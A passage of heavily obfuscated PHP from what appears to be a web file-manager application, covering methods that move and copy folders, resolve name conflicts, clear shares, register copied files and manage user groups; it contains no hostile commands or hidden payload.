$BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[28]]); goto CÜÙ¥¿Äï›; bå÷æˆÀ·Ü: $E‚¸İÄòà = array($BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[457]], $A¤“ º‰çÌ); if ($BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[367]] == $c¨õßßñÚ“[83]) { $E‚¸İÄòà[] = $b¨§ó±·Œ; } $this->updateModifyTime($E‚¸İÄòà); goto dµÈ”ôÊğÖ; Eå¡£Â£œ´: $this->lockWriteEnd($A¤“ º‰çÌ, $fÂ§Œ˜Ü—†); $this->folderSizeReset($BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[457]]); $this->folderSizeReset($A¤“ º‰çÌ); goto bå÷æˆÀ·Ü; dµÈ”ôÊğÖ: Model($c¨õßßñÚ“[501])->eventMove($b¨§ó±·Œ, $BÇ‰ªÍÌ¶œ[$c¨õßßñÚ“[457]], $A¤“ º‰çÌ); Hook::trigger($c¨õßßñÚ“[528], $C°ŸŒ–º°Ÿ); return $F†Å‡ÃÁùò; goto CÊˆ†½«‰; CÊˆ†½«‰: } private function _move($EåóöÔ´Í, $CáÃÊ¸ã«², $C½Õâ°ÔŠÉ, &$DÓÖ¿ôàÇ•, $C’÷æ¬ƒ‹ó = '') { goto BäŸƒ‡ôß›; aˆ†ÖÀĞ“: $e¼‚å²Àå = $C’÷æ¬ƒ‹ó ? $C’÷æ¬ƒ‹ó : $eÑ„×ÍŸÕš[$Fô«›‡Öõç[28]]; $B£ŒÓ±ÊÁğ = $this->fileNameExistCache($CáÃÊ¸ã«², $e¼‚å²Àå); $this->lockMoveStart($EåóöÔ´Í); goto bÄ—©æÅÊæ; f«›öáÂ‚: $CŠÇ¢–£· = !1; if ($bÑÇëƒ÷õÖ) { if ($C½Õâ°ÔŠÉ == REPEAT_RENAME_FOLDER) { $e¼‚å²Àå = $this->fileNameAuto($CáÃÊ¸ã«², $e¼‚å²Àå, $C½Õâ°ÔŠÉ, $bÑÇëƒ÷õÖ); $Fš‚ê ÀÌ¥ = $this->_moveForce($EåóöÔ´Í, $CáÃÊ¸ã«², $e¼‚å²Àå); } else { if ($C½Õâ°ÔŠÉ == REPEAT_RENAME_FOLDER) { $C½Õâ°ÔŠÉ = REPEAT_RENAME; } $A…ñ²ï‰Ñä = $this->_childrenListSelect($EåóöÔ´Í); foreach ($A…ñ²ï‰Ñä as $eÈ ™Êğ‡ô) { $this->_move($eÈ ™Êğ‡ô[$Fô«›‡Öõç[366]], $B£ŒÓ±ÊÁğ, $C½Õâ°ÔŠÉ, $DÓÖ¿ôàÇ•); } $CŠÇ¢–£· = !0; } } else { if ($C½Õâ°ÔŠÉ == REPEAT_SKIP) { $CŠÇ¢–£· = !0; } else { if ($C½Õâ°ÔŠÉ == REPEAT_RENAME || $C½Õâ°ÔŠÉ == REPEAT_RENAME_FOLDER) { $e¼‚å²Àå = $this->fileNameAuto($CáÃÊ¸ã«², $e¼‚å²Àå, $C½Õâ°ÔŠÉ, $bÑÇëƒ÷õÖ); $Fš‚ê ÀÌ¥ = $this->_moveForce($EåóöÔ´Í, $CáÃÊ¸ã«², $e¼‚å²Àå); } else { if ($C½Õâ°ÔŠÉ == REPEAT_REPLACE) { $Fæ¥È£¦ÛÄ = $this->sourceInfoCache($B£ŒÓ±ÊÁğ); $dª÷ƒ±¦¶ = $this->fileHistory($Fæ¥È£¦ÛÄ, $eÑ„×ÍŸÕš[$Fô«›‡Öõç[415]], $eÑ„×ÍŸÕš[$Fô«›‡Öõç[77]]); if ($dª÷ƒ±¦¶) { $DÓÖ¿ôàÇ•[$Fô«›‡Öõç[497]][] = $eÑ„×ÍŸÕš[$Fô«›‡Öõç[415]]; } else { $CŠÇ¢–£· = !0; } } } } } if ($CŠÇ¢–£· && !$DÓÖ¿ôàÇ•[$Fô«›‡Öõç[529]]) { $DÓÖ¿ôàÇ•[$Fô«›‡Öõç[529]] = !0; } goto fï‹îµ¢âÀ; bÄ—©æÅÊæ: $this->lockWriteStart($CáÃÊ¸ã«², $e¼‚å²Àå); if (!$B£ŒÓ±ÊÁğ) { return $this->_moveForce($EåóöÔ´Í, $CáÃÊ¸ã«², $e¼‚å²Àå); } $Fš‚ê ÀÌ¥ = $B£ŒÓ±ÊÁğ; goto f«›öáÂ‚; BäŸƒ‡ôß›: $Fô«›‡Öõç =& $_SERVER[Äº¡•ô™Ÿ]; $eÑ„×ÍŸÕš = $this->sourceInfo($EåóöÔ´Í); $bÑÇëƒ÷õÖ = $eÑ„×ÍŸÕš[$Fô«›‡Öõç[367]] == $Fô«›‡Öõç[83]; goto aˆ†ÖÀĞ“; fï‹îµ¢âÀ: return $Fš‚ê ÀÌ¥; goto DóŞ¦ñ·¢ğ; DóŞ¦ñ·¢ğ: } private function _moveForce($A¢ÅÚ×£…Æ, $Aï˜òÅË£ñ, $d¹ë£ó§Ñ©) { goto dŸ†ĞåÖ…Ö; b‰ÛàŠÀíî: if (!$D“«ÍÖŸßŞ) { Model($aÔ–¨É”÷[450])->authClear($A¢ÅÚ×£…Æ); } $eÎ ¬ÚöáÈ = $Bˆß¦‡’•Ÿ[$aÔ–¨É”÷[393]] == $aÔ–¨É”÷[83] && $aİš¢øšö÷[$aÔ–¨É”÷[393]] != $aÔ–¨É”÷[83]; if ($eÎ ¬ÚöáÈ) { $AÖÆ´ÀĞŞ[$aÔ–¨É”÷[392]] = 0; } goto bá‘Õ²â…¤; bá‘Õ²â…¤: if ($BÆòä’òµ¶) { $bÒ¯’‘Ş£¤ = array($aÔ–¨É”÷[521] => array($aÔ–¨É”÷[479], $Bˆß¦‡’•Ÿ[$aÔ–¨É”÷[455]] . $Bˆß¦‡’•Ÿ[$aÔ–¨É”÷[366]] . $aÔ–¨É”÷[480])); $bøÕÑ®ÉÆ¡ = $Bˆß¦‡’•Ÿ[$aÔ–¨É”÷[455]] . $Bˆß¦‡’•Ÿ[$aÔ–¨É”÷[366]] . $aÔ–¨É”÷[47]; $FŒË¾çàÎ = $aİš¢øšö÷[$aÔ–¨É”÷[455]] . $aİš¢øšö÷[$aÔ–¨É”÷[366]] . $aÔ–¨É”÷[47] . $Bˆß¦‡’•Ÿ[$aÔ–¨É”÷[366]] . $aÔ–¨É”÷[47]; $dÕ±éªÉà = array($aÔ–¨É”÷[521] => array($aÔ–¨É”÷[530], "\x72\145\160\154\x61\143\145\50\160\141\162\x65\156\x74\114\145\x76\145\154\x2c\x27{$bøÕÑ®ÉÆ¡}\x27\x2c\47{$FŒË¾çàÎ}\x27\x29"), $aÔ–¨É”÷[517] => $aİš¢øšö÷[$aÔ–¨É”÷[368]], $aÔ–¨É”÷[518] => $aİš¢øšö÷[$aÔ–¨É”÷[452]]); if ($eÎ ¬ÚöáÈ) { $dÕ±éªÉà[$aÔ–¨É”÷[392]] = 0; } $this->where($bÒ¯’‘Ş£¤)->data($dÕ±éªÉà)->save(); } $this->where(array($aÔ–¨É”÷[380] => $A¢ÅÚ×£…Æ))->data($AÖÆ´ÀĞŞ)->save(); return $A¢ÅÚ×£…Æ; goto D•ïÂµ²; C‰³Ùä± È: $BÆòä’òµ¶ = $Bˆß¦‡’•Ÿ[$aÔ–¨É”÷[367]] == $aÔ–¨É”÷[83]; $AÖÆ´ÀĞŞ = array($aÔ–¨É”÷[365] => $aİš¢øšö÷[$aÔ–¨É”÷[366]], $aÔ–¨É”÷[521] => $aİš¢øšö÷[$aÔ–¨É”÷[455]] . $aİš¢øšö÷[$aÔ–¨É”÷[366]] . $aÔ–¨É”÷[47], $aÔ–¨É”÷[517] => $aİš¢øšö÷[$aÔ–¨É”÷[368]], $aÔ–¨É”÷[518] => $aİš¢øšö÷[$aÔ–¨É”÷[452]], $aÔ–¨É”÷[520] => USER_ID, $aÔ–¨É”÷[383] => $d¹ë£ó§Ñ©); $D“«ÍÖŸßŞ = $Bˆß¦‡’•Ÿ[$aÔ–¨É”÷[368]] == SourceModel::TYPE_GROUP && $aİš¢øšö÷[$aÔ–¨É”÷[368]] == SourceModel::TYPE_GROUP && $Bˆß¦‡’•Ÿ[$aÔ–¨É”÷[452]] == $aİš¢øšö÷[$aÔ–¨É”÷[452]]; goto b‰ÛàŠÀíî; dŸ†ĞåÖ…Ö: $aÔ–¨É”÷ =& $_SERVER[Äº¡•ô™Ÿ]; $Bˆß¦‡’•Ÿ = $this->sourceInfo($A¢ÅÚ×£…Æ); $aİš¢øšö÷ = $this->sourceInfo($Aï˜òÅË£ñ); goto C‰³Ùä± È; D•ïÂµ²: } private function clearShare($bæ°«·ï”¡, $Cì‚ŒÁÂ†Ê) { goto A¹ÏÖŒ¼Íë; FáÊî‹ÉöÄ: if (!$B¿ïàÓ®®ë) { return; } $Cß¨‹À† = array($fÒ³Ûàƒä‰[366] => array($fÒ³Ûàƒä‰[7], $B¿ïàÓ®®ë), $fÒ³Ûàƒä‰[444] => 1); $aÌ½ã¨‰†  = Model($fÒ³Ûàƒä‰[532])->field($fÒ³Ûàƒä‰[437])->where($Cß¨‹À†)->select(); goto bÊ÷”é…£¥; CÀğñÏÙŠï: Model($fÒ³Ûàƒä‰[532])->where($Cß¨‹À†)->save(array($fÒ³Ûàƒä‰[444] => 0)); Model($fÒ³Ûàƒä‰[533])->where($Cß¨‹À†)->delete(); goto A…äô‡õŠ©; CŠÙ„›ñÌ: if ($FŒäâ÷ÒÍ­[$fÒ³Ûàƒä‰[452]] == $a’ÇÙÒ¹²È[$fÒ³Ûàƒä‰[452]] && $FŒäâ÷ÒÍ­[$fÒ³Ûàƒä‰[368]] == $fÒ³Ûàƒä‰[531]) { return; } $Cß¨‹À† = array($fÒ³Ûàƒä‰[455] => array($fÒ³Ûàƒä‰[479], $FŒäâ÷ÒÍ­[$fÒ³Ûàƒä‰[455]] . $bæ°«·ï”¡ . $fÒ³Ûàƒä‰[480])); $B¿ïàÓ®®ë = $this->field($fÒ³Ûàƒä‰[380])->where($Cß¨‹À†)->getField($fÒ³Ûàƒä‰[366], !0); goto FáÊî‹ÉöÄ; A¹ÏÖŒ¼Íë: $fÒ³Ûàƒä‰ =& $_SERVER[Äº¡•ô™Ÿ]; $FŒäâ÷ÒÍ­ = $this->sourceInfo($bæ°«·ï”¡); $a’ÇÙÒ¹²È = $this->sourceInfo($Cì‚ŒÁÂ†Ê); goto CŠÙ„›ñÌ; bÊ÷”é…£¥: if (!$aÌ½ã¨‰† ) { return; } $aÌ½ã¨‰†  = array_to_keyvalue($aÌ½ã¨‰† , $fÒ³Ûàƒä‰[33], $fÒ³Ûàƒä‰[437]); $Cß¨‹À† = array($fÒ³Ûàƒä‰[437] => array($fÒ³Ûàƒä‰[7], $aÌ½ã¨‰† )); goto CÀğñÏÙŠï; A…äô‡õŠ©: } public function copyFolderFromIO($bª‹ì™¬Œ¹, $EÛ¶šØÔ‘ğ, $fÛŒë½æğ», $Fã«æÙ´ß…, $A‡ÛÅœ¥ê, $eê¦ö’Ôôõ = false) { goto B†ùø©²†ï; Aƒà­›•­…: Model($FÌíŒÜÕ[500])->addAll($F‚Ë‚¤†[$FÌíŒÜÕ[498]], array(), !0); Model($FÌíŒÜÕ[501])->eventCopy($dÖšÕ»¬Ï‡); $this->saveAll($F‚Ë‚¤†[$FÌíŒÜÕ[499]]); goto fï—Ñ¡Ùî‘; B†ùø©²†ï: $FÌíŒÜÕ =& $_SERVER[Äº¡•ô™Ÿ]; $F‚Ë‚¤† = array($FÌíŒÜÕ[498] => array(), $FÌíŒÜÕ[499] => array(), $FÌíŒÜÕ[497] => array(), $FÌíŒÜÕ[534] => array()); $eßœî™“¼ = $eê¦ö’Ôôõ ? $eê¦ö’Ôôõ : $bª‹ì™¬Œ¹->getPathName($bª‹ì™¬Œ¹->pathThis($EÛ¶šØÔ‘ğ)); goto B®éš©¡òÒ; B®éš©¡òÒ: $AÁÆ­çÂÒ£ = $this->fileNameExist($fÛŒë½æğ», $eßœî™“¼); $dÖšÕ»¬Ï‡ = $this->mkdir($fÛŒë½æğ», $eßœî™“¼, $Fã«æÙ´ß…); if (!$AÁÆ­çÂÒ£ || $Fã«æÙ´ß… == REPEAT_RENAME_FOLDER) { $Fã«æÙ´ß… = !1; } goto A¢¦¦©ÓÑˆ; fï—Ñ¡Ùî‘: Model($FÌíŒÜÕ[418])->linkAdd($F‚Ë‚¤†[$FÌíŒÜÕ[497]]); Model($FÌíŒÜÕ[418])->remove($F‚Ë‚¤†[$FÌíŒÜÕ[534]]); $this->folderSizeReset($fÛŒë½æğ»); goto dÂ©®âÙš¦; dÂ©®âÙš¦: $this->updateModifyTime($fÛŒë½æğ»); return $dÖšÕ»¬Ï‡; goto dÊ¢î¶…ÖÑ; A¢¦¦©ÓÑˆ: if ($AÁÆ­çÂÒ£) { $this->_childrenAllMake($AÁÆ­çÂÒ£); } Hook::trigger($FÌíŒÜÕ[535]); $this->_copyChildTo($bª‹ì™¬Œ¹, $EÛ¶šØÔ‘ğ, $dÖšÕ»¬Ï‡, $Fã«æÙ´ß…, $F‚Ë‚¤†, $A‡ÛÅœ¥ê); goto dİªËÍ æ; dİªËÍ æ: Hook::trigger($FÌíŒÜÕ[536]); if ($dÖšÕ»¬Ï‡) { $this->folderSizeResetChildren($dÖšÕ»¬Ï‡); } $this->_childrenListClear(); goto Aƒà­›•­…; dÊ¢î¶…ÖÑ: } private function _copyChildTo($eŞåÌİßï, $D¼Æ´Î¡Ş, $dâÆ…¹Òè£, $Fîùâº÷Íã, &$b™†±äòÄÚ, $aŸ¼†‹÷ÎÓ) { goto C·³†Ìêšã; añíŸÊß: foreach ($Bé„Æ÷ä¦¬ as &$f‘¹©”ƒË‹) { goto DÎƒîÑ‰‚¢; CÖ±ˆÉ•¨²: $f‘¹©”ƒË‹[$FêŠ÷ö·ê[77]] = _get($f‘¹©”ƒË‹, $FêŠ÷ö·ê[77], 0); $f‘¹©”ƒË‹[$FêŠ÷ö·ê[415]] = _get($f‘¹©”ƒË‹, $FêŠ÷ö·ê[415], 0); if (!isset($f‘¹©”ƒË‹[$FêŠ÷ö·ê[537]]) && $f‘¹©”ƒË‹[$FêŠ÷ö·ê[415]]) { $b™†±äòÄÚ[$FêŠ÷ö·ê[534]][] = $f‘¹©”ƒË‹[$FêŠ÷ö·ê[415]]; } goto E…‡ª·Õ¢¬; DÎƒîÑ‰‚¢: if (isset($aª³¥Èê[$f‘¹©”ƒË‹[$FêŠ÷ö·ê[28]]])) { $f‘¹©”ƒË‹ = $aª³¥Èê[$f‘¹©”ƒË‹[$FêŠ÷ö·ê[28]]]; } $f‘¹©”ƒË‹[$FêŠ÷ö·ê[367]] = $f‘¹©”ƒË‹[$FêŠ÷ö·ê[29]] == $FêŠ÷ö·ê[76]; $f‘¹©”ƒË‹[$FêŠ÷ö·ê[369]] = _get($f‘¹©”ƒË‹, $FêŠ÷ö·ê[157], $FêŠ÷ö·ê[33]); goto CÖ±ˆÉ•¨²; E…‡ª·Õ¢¬: if ($Fîùâº÷Íã) { $B¯ğµÇ¹è = $this->fileNameExistCache($dâÆ…¹Òè£, $f‘¹©”ƒË‹[$FêŠ÷ö·ê[28]]); if ($B¯ğµÇ¹è) { if ($f‘¹©”ƒË‹[$FêŠ÷ö·ê[367]] || $Fîùâº÷Íã == REPEAT_SKIP) { continue; } if ($Fîùâº÷Íã == REPEAT_REPLACE) { $fâ¬Ş±®Ù = $this->sourceInfoCache($B¯ğµÇ¹è); $DÊô¶Ê ë = $this->fileHistory($fâ¬Ş±®Ù, $f‘¹©”ƒË‹[$FêŠ÷ö·ê[415]], $f‘¹©”ƒË‹[$FêŠ÷ö·ê[77]]); if ($DÊô¶Ê ë) { $b™†±äòÄÚ[$FêŠ÷ö·ê[497]][] = $f‘¹©”ƒË‹[$FêŠ÷ö·ê[415]]; } continue; } else { if ($Fîùâº÷Íã == REPEAT_RENAME) { $f‘¹©”ƒË‹[$FêŠ÷ö·ê[28]] = $this->fileNameAutoCache($dâÆ…¹Òè£, $f‘¹©”ƒË‹[$FêŠ÷ö·ê[28]], $Fîùâº÷Íã, !1); } } } } if (!$f‘¹©”ƒË‹[$FêŠ÷ö·ê[367]] && $f‘¹©”ƒË‹[$FêŠ÷ö·ê[415]]) { $b™†±äòÄÚ[$FêŠ÷ö·ê[497]][] = $f‘¹©”ƒË‹[$FêŠ÷ö·ê[415]]; } $dŸ·‘’ø¡š[] = $this->_makeItemData($f‘¹©”ƒË‹, $Eôê×õŸ¢å, $f‘¹©”ƒË‹[$FêŠ÷ö·ê[28]]); goto A¯¡ô‘­íï; A¯¡ô‘­íï: } unset($f‘¹©”ƒË‹); if (!empty($dŸ·‘’ø¡š)) { $this->addAll($dŸ·‘’ø¡š); } goto AìÅ¨£İ²’; FÇŠÄ©¢Ş: $Bé„Æ÷ä¦¬ = array_merge($C¦ŠãğÈ–[$FêŠ÷ö·ê[73]], $C¦ŠãğÈ–[$FêŠ÷ö·ê[74]]); $aª³¥Èê = $this->_addFiles($eŞåÌİßï, $C¦ŠãğÈ–[$FêŠ÷ö·ê[73]], $aŸ¼†‹÷ÎÓ); $dŸ·‘’ø¡š = array(); goto añíŸÊß; AìÅ¨£İ²’: $DòŒ†ËåÀ‡ = $this->_childrenList($dâÆ…¹Òè£); $DòŒ†ËåÀ‡ = array_to_keyvalue($DòŒ†ËåÀ‡, $FêŠ÷ö·ê[28]); foreach ($Bé„Æ÷ä¦¬ as $f‘¹©”ƒË‹) { $fâ¬Ş±®Ù = $DòŒ†ËåÀ‡[$f‘¹©”ƒË‹[$FêŠ÷ö·ê[28]]]; $fˆ…¯ÉÈ¶ = $fâ¬Ş±®Ù[$FêŠ÷ö·ê[366]]; $this->_copyApplyMeta($fâ¬Ş±®Ù, $b™†±äòÄÚ); if ($f‘¹©”ƒË‹[$FêŠ÷ö·ê[29]] == $FêŠ÷ö·ê[76]) { $f‘¹©”ƒË‹[$FêŠ÷ö·ê[75]] = $eŞåÌİßï->getPathInner($f‘¹©”ƒË‹[$FêŠ÷ö·ê[75]]); $this->_copyChildTo($eŞåÌİßï, $f‘¹©”ƒË‹[$FêŠ÷ö·ê[75]], $fˆ…¯ÉÈ¶, $Fîùâº÷Íã, $b™†±äòÄÚ, $aŸ¼†‹÷ÎÓ); } } goto EÖ°ëÃË™¥; C·³†Ìêšã: $FêŠ÷ö·ê =& $_SERVER[Äº¡•ô™Ÿ]; $Eôê×õŸ¢å = $this->sourceInfoCache($dâÆ…¹Òè£); $C¦ŠãğÈ– = $eŞåÌİßï->listPath($D¼Æ´Î¡Ş, !1, !0); goto FÇŠÄ©¢Ş; EÖ°ëÃË™¥: } private function _addFiles($e†¬º¿‚É‚, $C¯‰·ŒÑ£½, $Bó×òµƒÁ–) { goto c”æŠ¢ñ‚í; c”æŠ¢ñ‚í: $AÀÆÖ¾ÛĞä =& $_SERVER[Äº¡•ô™Ÿ]; if (!$C¯‰·ŒÑ£½ || count($C¯‰·ŒÑ£½) == 0) { return array(); } $b÷Âˆ¸„õŠ = array(); goto E‚ßÕ¤Ø‘Ó; fÉ‘ó–¾«Ê: $dõ»«Â•Ã‘ = array($AÀÆÖ¾ÛĞä[160] => array($AÀÆÖ¾ÛĞä[7], array_keys($b÷Âˆ¸„õŠ))); $dî£ğ‰ùÓé = $f¦ÌŒ£îÏã->where($dõ»«Â•Ã‘)->select(); $dî£ğ‰ùÓé = $dî£ğ‰ùÓé ? $dî£ğ‰ùÓé : array(); goto F‡ºòôÎºÕ; E‚ßÕ¤Ø‘Ó: foreach ($C¯‰·ŒÑ£½ as &$DĞäí‚áà…) { goto Bºàœ‡¾ê; f¨‹ï–¾š: $A£¶ßÕÍ«Ä = $e†¬º¿‚É‚->hashMd5($DĞäí‚áà…[$AÀÆÖ¾ÛĞä[75]]); if (strlen($A£¶ßÕÍ«Ä) > 10 && !isset($b÷Âˆ¸„õŠ[$A£¶ßÕÍ«Ä])) { $b÷Âˆ¸„õŠ[$A£¶ßÕÍ«Ä] = array(); } $DĞäí‚áà…[$AÀÆÖ¾ÛĞä[161]] = $FÊì”ÁÈ…; goto Aå§š®œÜ; Aå§š®œÜ: $DĞäí‚áà…[$AÀÆÖ¾ÛĞä[160]] = $A£¶ßÕÍ«Ä; Hook::trigger($AÀÆÖ¾ÛĞä[539], $DĞäí‚áà…); $b÷Âˆ¸„õŠ[$A£¶ßÕÍ«Ä][] =& $DĞäí‚áà…; goto D¨èéÛ„Ü±; Bºàœ‡¾ê: Hook::trigger($AÀÆÖ¾ÛĞä[538], $DĞäí‚áà…); $DĞäí‚áà…[$AÀÆÖ¾ÛĞä[75]] = $e†¬º¿‚É‚->getPathInner($DĞäí‚áà…[$AÀÆÖ¾ÛĞä[75]]); $FÊì”ÁÈ… = $e†¬º¿‚É‚->hashSimple($DĞäí‚áà…[$AÀÆÖ¾ÛĞä[75]]); goto f¨‹ï–¾š; D¨èéÛ„Ü±: if (count($b÷Âˆ¸„õŠ[$A£¶ßÕÍ«Ä]) > 1) { $DĞäí‚áà…[$AÀÆÖ¾ÛĞä[537]] = !0; } goto FÊÎ‹Í¯Â; FÊÎ‹Í¯Â: } $dõ»«Â•Ã‘ = array($AÀÆÖ¾ÛĞä[160] => array($AÀÆÖ¾ÛĞä[7], array_keys($b÷Âˆ¸„õŠ))); $f¦ÌŒ£îÏã = Model($AÀÆÖ¾ÛĞä[540]); goto BÜå¶ ©ø; Aæ˜ÇâÕ‡Ü: return $d›¾É‹Î³; goto Fê¿·ø×¾; Aä÷â™ƒº‘: $eŒ¼ËÛîİ = array(); foreach ($C¯‰·ŒÑ£½ as $aÄ¾‘Í) { if (isset($aÄ¾‘Í[$AÀÆÖ¾ÛĞä[537]]) && $aÄ¾‘Í[$AÀÆÖ¾ÛĞä[537]]) { continue; } $BÂÜ…¼ôœÙ = $e†¬º¿‚É‚->getPathInner($aÄ¾‘Í[$AÀÆÖ¾ÛĞä[75]]); $F‹¨Îå±´Õ = $f¦ÌŒ£îÏã->addFileMake($BÂÜ…¼ôœÙ, $aÄ¾‘Í[$AÀÆÖ¾ÛĞä[77]], $aÄ¾‘Í[$AÀÆÖ¾ÛĞä[161]], $aÄ¾‘Í[$AÀÆÖ¾ÛĞä[160]], $aÄ¾‘Í[$AÀÆÖ¾ÛĞä[28]], $Bó×òµƒÁ–); $eŒ¼ËÛîİ[] = $F‹¨Îå±´Õ; } $f¦ÌŒ£îÏã->addAll($eŒ¼ËÛîİ); goto fÉ‘ó–¾«Ê; BÜå¶ ©ø: $dî£ğ‰ùÓé = $f¦ÌŒ£îÏã->where($dõ»«Â•Ã‘)->select(); $dî£ğ‰ùÓé = $dî£ğ‰ùÓé ? $dî£ğ‰ùÓé : array(); foreach ($dî£ğ‰ùÓé as $A£Á«·ğ¼Ô) { if (!isset($b÷Âˆ¸„õŠ[$A£Á«·ğ¼Ô[$AÀÆÖ¾ÛĞä[160]]])) { continue; } $E˜£œö¸› = $b÷Âˆ¸„õŠ[$A£Á«·ğ¼Ô[$AÀÆÖ¾ÛĞä[160]]]; foreach ($E˜£œö¸› as &$DĞäí‚áà…) { $DĞäí‚áà…[$AÀÆÖ¾ÛĞä[415]] = $A£Á«·ğ¼Ô[$AÀÆÖ¾ÛĞä[415]]; $DĞäí‚áà…[$AÀÆÖ¾ÛĞä[537]] = !0; } unset($DĞäí‚áà…); } goto Aä÷â™ƒº‘; F‡ºòôÎºÕ: foreach ($dî£ğ‰ùÓé as $A£Á«·ğ¼Ô) { if (!isset($b÷Âˆ¸„õŠ[$A£Á«·ğ¼Ô[$AÀÆÖ¾ÛĞä[160]]])) { continue; } $d°øí°¬¸ˆ =& $b÷Âˆ¸„õŠ[$A£Á«·ğ¼Ô[$AÀÆÖ¾ÛĞä[160]]]; foreach ($d°øí°¬¸ˆ as &$DĞäí‚áà…) { $DĞäí‚áà…[$AÀÆÖ¾ÛĞä[415]] = $A£Á«·ğ¼Ô[$AÀÆÖ¾ÛĞä[415]]; } unset($DĞäí‚áà…); } $d›¾É‹Î³ = array(); foreach ($C¯‰·ŒÑ£½ as $Aå¢§ÛŞô) { $d›¾É‹Î³[$Aå¢§ÛŞô[$AÀÆÖ¾ÛĞä[28]]] = $Aå¢§ÛŞô; } goto Aæ˜ÇâÕ‡Ü; Fê¿·ø×¾: } } define($_SERVER[Äº¡•ô™Ÿ][541], $_SERVER[Äº¡•ô™Ÿ][542]); goto eÃöãòµœ‹; Dõ¬ÑšÅ´Û: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\x70"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\x61\x6d\x65" => "\147\x72\x6f\165\x70\137\x6d\x65\164\141", "\155\145\x74\141\106\x69\x65\154\x64" => "\x67\162\x6f\165\x70\111\104"); protected function cacheFunctionAlias($B‚¡ëŠ†¬ó) { $A¿ëƒƒ‡§Û =& $_SERVER[Äº¡•ô™Ÿ]; return array($A¿ëƒƒ‡§Û[2145] => array($B‚¡ëŠ†¬ó[0], $A¿ëƒƒ‡§Û[2146]), $A¿ëƒƒ‡§Û[2147] => array($B‚¡ëŠ†¬ó[0], $A¿ëƒƒ‡§Û[2146])); } protected function getInfo($eË¬Ûì½§) { $FÏƒ‡Šºå“ = $this->getInfoSimple($eË¬Ûì½§); if (!$FÏƒ‡Šºå“) { return !1; } return $this->_listDataApplyItem($FÏƒ‡Šºå“); } protected function getInfoSimple($fËğÊ¢Ôô¬, $DÇˆ¨Ú·ë  = false) { $dæ‰³éÔ =& $_SERVER[Äº¡•ô™Ÿ]; if ($DÇˆ¨Ú·ë ) { $Cµ â»¦¯Ö = array($dæ‰³éÔ[2079] => intval($fËğÊ¢Ôô¬)); $Bˆèä–µ‘¨ = $this->where($Cµ â»¦¯Ö)->find(); return is_array($Bˆèä–µ‘¨) ? $Bˆèä–µ‘¨ : array(); } return $this->cacheFunctionGet($dæ‰³éÔ[2148], $fËğÊ¢Ôô¬); } protected function groupAdd($cÜ¦øˆÆ¨) { goto a· £å’œÎ; Aç¸æÅ­Ë: $BèŠ¾²–Ä¦ = $this->add($f âç“ÁÖÊ); $this->setNamePinyin($BèŠ¾²–Ä¦, $f âç“ÁÖÊ[$DÍÀ¤¦ÖòË[28]]); Model($DÍÀ¤¦ÖòË[1110])->groupRootAdd($BèŠ¾²–Ä¦); goto b»”‚Ç¡œ–; a· £å’œÎ: $DÍÀ¤¦ÖòË =& $_SERVER[Äº¡•ô™Ÿ]; if (!$cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[457]] && isset($cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[2079]]) && $cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[2079]] == 1) { if ($b™Ú¶×ù¶ = $this->getInfoSimple($cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[2079]], !0)) { return $cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[2079]]; } } else { $b™Ú¶×ù¶ = $this->getInfoSimple($cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[457]]); if (!$b™Ú¶×ù¶) { return !1; } } $AÀÕ•£¾¦ = $DÍÀ¤¦ÖòË[466]; goto a¯Ù·ƒó†Õ; b»”‚Ç¡œ–: return $BèŠ¾²–Ä¦; goto Dò ĞÕ«ˆ¯; a¯Ù·ƒó†Õ: if ($b™Ú¶×ù¶[$DÍÀ¤¦ÖòË[455]]) { $AÀÕ•£¾¦ = $b™Ú¶×ù¶[$DÍÀ¤¦ÖòË[455]] . $b™Ú¶×ù¶[$DÍÀ¤¦ÖòË[2079]] . $DÍÀ¤¦ÖòË[47]; } $f âç“ÁÖÊ = array($DÍÀ¤¦ÖòË[383] => $this->groupNameAuto($cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[457]], $cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[28]]), $DÍÀ¤¦ÖòË[365] => $cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[457]], $DÍÀ¤¦ÖòË[521] => $AÀÕ•£¾¦, $DÍÀ¤¦ÖòË[2149] => $cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[2063]], $DÍÀ¤¦ÖòË[2150] => 0, $DÍÀ¤¦ÖòË[2083] => 0); if (!empty($cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[2079]])) { $f âç“ÁÖÊ[$DÍÀ¤¦ÖòË[2079]] = $cÜ¦øˆÆ¨[$DÍÀ¤¦ÖòË[2079]]; } goto Aç¸æÅ­Ë; Dò ĞÕ«ˆ¯: } protected function groupEdit($A´¡½šÁõè, $F­ŸŒ¬²í) { $dêßÚÃä¡õ =& $_SERVER[Äº¡•ô™Ÿ]; if (!empty($F­ŸŒ¬²í[$dêßÚÃä¡õ[457]])) { $b´†Š¶ø”‚ = $this->getInfoSimple($A´¡½šÁõè); $Bß· ËåÄ = $this->getInfoSimple($F­ŸŒ¬²í[$dêßÚÃä¡õ[457]]); if (!$b´†Š¶ø”‚ || !$Bß· ËåÄ) { return !1; } if ($b´†Š¶ø”‚[$dêßÚÃä¡õ[2079]] == $Bß· ËåÄ[$dêßÚÃä¡õ[2079]]) { return !1; } if ($F­ŸŒ¬²í[$dêßÚÃä¡õ[457]] != $b´†Š¶ø”‚[$dêßÚÃä¡õ[457]]) { if ($Bß· ËåÄ[$dêßÚÃä¡õ[455]] !== $b´†Š¶ø”‚[$dêßÚÃä¡õ[455]] && strpos($Bß· ËåÄ[$dêßÚÃä¡õ[455]], $b´†Š¶ø”‚[$dêßÚÃä¡õ[455]] . $b´†Š¶ø”‚[$dêßÚÃä¡õ[2079]] . $dêßÚÃä¡õ[47]) === 0) { return !1; } $F­ŸŒ¬²í[$dêßÚÃä¡õ[521]] = $Bß· ËåÄ[$dêßÚÃä¡õ[455]] . 